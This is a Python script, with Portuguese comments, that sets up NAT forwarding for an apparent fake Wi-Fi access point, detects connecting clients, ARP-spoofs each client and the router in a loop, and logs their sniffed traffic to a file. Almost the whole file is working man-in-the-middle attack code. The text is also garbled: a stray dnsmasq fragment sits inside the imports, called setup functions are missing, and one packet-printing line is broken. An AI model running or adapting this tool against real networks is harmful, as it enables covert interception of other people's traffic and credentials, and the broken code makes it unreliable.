import os
import subprocess
import sys
import time    with open('dnsmasq.conf', 'w') as f:
        f.write(dnsmasq_conf)

    subprocess.run(['sudo', 'dnsmasq', '-C', 'dnsmasq.conf'], check=True)
import threading
import scapy
from scapy.all import ARP, Ether, send, sniff

# Verifica se o script está sendo executado como root
def check_root():
    if os.geteuid() != 0:
        print("This script requires superuser privileges. Please run it with sudo.")
        sys.exit(1)

def restart_network_interface(interface):
    subprocess.run(['sudo', 'ip', 'link', 'set', interface, 'down'], check=True)
    subprocess.run(['sudo', 'ip', 'link', 'set', interface, 'up'], check=True)

def stop_dnsmasq():
    print("Do Stop_dnsmasq")
    subprocess.run(['sudo', 'pkill', 'dnsmasq'], check=True)
    subprocess.run(['sudo', 'systemctl', 'start', 'systemd-resolved'], check=True)

# Habilita o encaminhamento de IP
def enable_ip_forwarding():
    subprocess.run(['sudo', 'sysctl', '-w', 'net.ipv4.ip_forward=1'], check=True)
    subprocess.run(['sudo', 'iptables', '-t', 'nat', '-A', 'POSTROUTING', '-o', 'wlp2s0', '-j', 'MASQUERADE'], check=True)
    subprocess.run(['sudo', 'iptables', '-A', 'FORWARD', '-i', 'wlp2s0', '-o', 'wlx90f652e783cb', '-m', 'state', '--state','RELATED,ESTABLISHED', '-j', 'ACCEPT'], check=True)
    subprocess.run(['sudo', 'iptables', '-A', 'FORWARD', '-i', 'wlx90f652e783cb', '-o', 'wlp2s0', '-j', 'ACCEPT'], check=True)

# Desabilita o encaminhamento de IP
def disable_ip_forwarding():
    subprocess.run(['sudo', 'sysctl', '-w', 'net.ipv4.ip_forward=0'], check=True)
    subprocess.run(['sudo', 'iptables', '-t', 'nat', '-D', 'POSTROUTING', '-o', 'wlp2s0', '-j', 'MASQUERADE'], check=True)
    subprocess.run(['sudo', 'iptables', '-D', 'FORWARD', '-i', 'wlp2s0', '-o', 'wlx90f652e783cb', '-m', 'state', '--state','RELATED,ESTABLISHED', '-j', 'ACCEPT'], check=True)
    subprocess.run(['sudo', 'iptables', '-D', 'FORWARD', '-i', 'wlx90f652e783cb', '-o', 'wlp2s0', '-j', 'ACCEPT'], check=True)

# Função para realizar o ataque MITM
def mitm_attack(victim_ip, victim_mac, router_ip, router_mac):
    send(ARP(op=2, pdst=victim_ip, psrc=router_ip, hwdst=victim_mac))
    send(ARP(op=2, pdst=router_ip, psrc=victim_ip, hwdst=router_mac))

# Callback para capturar e salvar pacotes
def packet_callback(packet):
    with open("captured_packets_fakeAP.txt", "a") as f:
        f.write(f"Packet: {packet.summary()}\n")
        packet.summary.show()
        f.write(str(packet) + '\n\n')

# Função que inicia o sniffing e o ataque MITM em uma nova thread
def handle_client(client_ip, client_mac, router_ip, router_mac):
    print(f"~~~Handling client {client_ip}...")
    try:
        while True:
            mitm_attack(client_ip, client_mac, router_ip, router_mac)
            sniff(prn=packet_callback, filter=f"host {client_ip}", iface='wlx90f652e783cb', store=0, timeout=10)
            time.sleep(0.5)
    except KeyboardInterrupt:
        print(f"\nStopping MITM attack for client {client_ip} and restoring ARP tables.")
        reassign_arp(client_ip, router_ip, client_mac, router_mac)

# Função para restabelecer a conexão entre o roteador e a vítima
def reassign_arp(victim_ip, router_ip, victim_mac, router_mac):
    print(f"~~~Reassigning ARP for {victim_ip}...")
    send(ARP(op=2, pdst=router_ip, psrc=victim_ip, hwdst=router_mac, hwsrc=victim_mac), count=7)
    send(ARP(op=2, pdst=victim_ip, psrc=router_ip, hwdst=victim_mac, hwsrc=router_mac), count=7)

# Função para obter o endereço MAC de um IP
def get_mac_address(ip_address):
    try:
        subprocess.run(["ping", "-c", "1", ip_address], capture_output=True, text=True, check=True)
        result = subprocess.run(["arp", "-n", ip_address], capture_output=True, text=True, check=True)
        for line in result.stdout.split('\n'):
            if ip_address in line:
                parts = line.split()
                if len(parts) >= 3:
                    return parts[2]
        print(f"MAC address for {ip_address} not found")
    except subprocess.CalledProcessError as e:
        print(f"Error getting MAC address: {e}")
        sys.exit(1)

# Função principal
def main():
    check_root()

    # Inicia o hostapd e dnsmasq
    #start_hostapd()
    #start_dnsmasq()

    # Habilita o encaminhamento de IP
    enable_ip_forwarding()

    router_ip = '192.168.1.254'
    router_mac = get_mac_address(router_ip)

    if not router_mac:
        print("Unable to get MAC address of the router")
        sys.exit(1)

    print("~~~Starting MITM on all clients connected to the Fake AP...")

    clients = {}

    def sniff_clients(packet):
        if packet.haslayer(ARP) and packet[ARP].op in (1, 2):  # who-has or is-at
            client_ip = packet[ARP].psrc
            client_mac = packet[ARP].hwsrc

            if client_ip not in clients:
                clients[client_ip] = client_mac
                print(f"New client detected: IP={client_ip}, MAC={client_mac}")
                threading.Thread(target=handle_client, args=(client_ip, client_mac, router_ip, router_mac)).start()

    try:
        while True:
            sniff(prn=sniff_clients, iface='wlx90f652e783cb', store=0, timeout=10)
            time.sleep(0.5)

    except KeyboardInterrupt:
        disable_ip_forwarding()
        print("\nStopping MITM attack and restoring network settings.")
        stop_dnsmasq()
        sys.exit(1)

if __name__ == "__main__":
    main()
